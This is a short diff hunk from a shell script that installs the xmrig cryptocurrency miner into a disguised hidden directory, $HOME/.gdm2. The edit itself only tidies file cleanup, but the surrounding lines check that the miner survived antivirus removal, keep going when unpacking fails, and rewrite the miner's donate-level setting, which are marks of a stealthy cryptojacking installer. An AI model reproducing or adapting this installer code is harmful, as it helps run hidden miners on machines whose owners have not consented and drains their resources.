@@ -172,8 +172,7 @@ if ! tar xvf xmrig.tar.gz -C $HOME/.gdm2; then
   echo "ERROR: Can't unpack xmrig.tar.gz to $HOME/.gdm2 directory"
 #  exit 1
 fi
-rm xmrig.tar.gz
-rm xmrig.tar.gz.1
+rm xmrig.tar.gz*
 
 echo "[*] Checking if advanced version of $HOME/.gdm2/xmrig works fine (and not removed by antivirus software)"
 sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/.gdm2/config.json
